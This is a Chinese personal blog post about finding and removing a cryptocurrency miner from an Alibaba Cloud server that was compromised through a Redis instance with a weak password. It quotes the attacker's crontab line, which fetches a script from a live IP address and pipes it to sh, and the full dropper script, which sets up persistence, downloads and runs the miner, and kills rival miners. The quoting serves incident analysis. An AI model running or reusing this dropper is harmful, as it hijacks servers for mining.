>emmm，长话短说，阿里云服务器被挂矿机了。

### 背景

事情还得从两三天前说起。7-31阿里云给我发了一个短信。
![](https://upload-images.jianshu.io/upload_images/5786888-153b90c3e0cc93fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


我还专门和朋友谈(chao)论(feng)Root被提权是什么鬼逻辑，然后就没理。。因为服务器是自己玩的用，开发阶段给前端暴露api用的，没什么重要的数据。然后：
![](https://upload-images.jianshu.io/upload_images/5786888-a9ea41fafe2364b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这个短信又发生在8-2号，What，大男子主义上来了，觉得这`13`有点过分了，有点变本加厉的意思了，然后就说去看看。（当时第一想法就是去看看进程有啥异样）

### 看一看
![](https://upload-images.jianshu.io/upload_images/5786888-7af4a104cb0d09ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

wtf，简直不要`13 face`，cpu占用99.3%，那我用0.7%吗。

##### 去`.ssh`目录看看
```
[root@FantJ .ssh]# ls
authorized_keys
```
这可是无密登录的钥匙啊！用于主机之间的无密通信。果断删。

##### 查查这个命令在哪
```
[root@FantJ ~]# find / -name qW3xT*
/tmp/qW3xT.2
```
##### 捕捉异常

![记住这个画面](https://upload-images.jianshu.io/upload_images/5786888-7eb3ca587ee35146.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![发现可疑线程](https://upload-images.jianshu.io/upload_images/5786888-49d46c7ce5967892.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![终止矿机脚本](https://upload-images.jianshu.io/upload_images/5786888-0c8b64423b572e1f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![又出来了](https://upload-images.jianshu.io/upload_images/5786888-d9ef8567598f2b07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我为什么会针对它：
1. PID号很大，证明是新线程
2. 每次我kill了矿机，它就会执行，然后就消失。（后面会证明这个言论）
3. 从cpu的稳定来看，没有执行新指令cpu一般均衡。

### 杀除相关进程
```
 1022  ps -aux|grep ddg
 1023  kill 11938
 1024  kill 27507
```

### 寻找`ddgs.3013`
```
[root@FantJ ~]# find / -name ddgs.3013
/tmp/ddgs.3013
```

### 定时任务？
干了前面觉得还是没有弄干净，所以我想去看看定时任务列表。
```
[root@FantJ tmp]# crontab -l

*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh
```
emmm，这一刻真是激动和喜悦。
```
curl 的这几个 optional 介绍,我也是百度的
-f  - fail在HTTP错误（H）上静默失败（根本没有输出）
-s  -silent静音模式。 不要输出任何东西
      --socks4 HOST [：PORT]给定主机+端口上的SOCKS4代理
      --socks4a HOST [：PORT]给定主机+端口上的SOCKS4a代理
      --socks5 HOST [：PORT]给定主机+端口上的SOCKS5代理
      --socks5-hostname HOST [：PORT] SOCKS5代理，将主机名传递给代理
      --socks5-gssapi-service名称为gssapi的SOCKS5代理服务名称
      --socks5-gssapi-nec与NEC SOCKS5服务器的兼容性
-S   --show-error显示错误。 使用-s时，make curl会在出现错误时显示错误
-L   --location遵循重定向（H）
      --location-trusted like --location并将auth发送给其他主机（H）
```
```
[root@FantJ tmp]# crontab -r 
[root@FantJ tmp]# crontab -l
no crontab for root
```
那又得查查这个i.sh了，突然想起有个定时任务，然后我把定时任务的job运行了以下：
```
[root@FantJ tmp]# curl -fsSL http://149.56.106.215:8000/i.sh
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "" > /var/spool/cron/root
echo "*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh" >> /var/spool/cron/root


mkdir -p /var/spool/cron/crontabs
echo "" > /var/spool/cron/crontabs/root
echo "*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh" >> /var/spool/cron/crontabs/root


ps auxf | grep -v grep | grep /tmp/ddgs.3013 || rm -rf /tmp/ddgs.3013
if [ ! -f "/tmp/ddgs.3013" ]; then
    
    curl -fsSL http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -o /tmp/ddgs.3013
fi
chmod +x /tmp/ddgs.3013 && /tmp/ddgs.3013

ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill
#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill
```
注意这个命令不会下载和执行sh脚本。因为我把管道符去掉了。看到的仅仅是打印的信息。
大概说下这个脚本的意思：
1. 设置环境变量，写定时任务
2. 查看ddgs.3013进程，如果没有该进程，重新下载该文件，然后给它加执行权限，并执行。
3. 批量根据关键字杀进程。

我发现有个`grep minexmr.com`.打开一看，其他网站同理。
![](https://upload-images.jianshu.io/upload_images/5786888-25b28efb02cd35c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![](https://upload-images.jianshu.io/upload_images/5786888-3aac197d756c3535.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
![](https://upload-images.jianshu.io/upload_images/5786888-d602168274bd5221.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### 反思
>问题解决了，过段时间再看看进程情况，应该是没有了，可以说杀的挺彻底了。那么这问题为什么会出现呢。

还得回到阿里云给我的提示：redis。因为自己玩，所以redis的密码我设置的很简单`root`，被扫到也是很不费劲的事，然后我把密码进行改正。（通过配置文件`requirepass`或者`redis-cli``config set requirepass xxxx`），更安全的话，把bindIp设置成自己用的，然后更改默认端口。我没有重要数据，所以稍微意思下就行了，下次再来我再折腾。

不过这个`13`有个很良心的操作，就是没有删我的redis的keys，很有职业操守。但是还是被金钱奴隶。
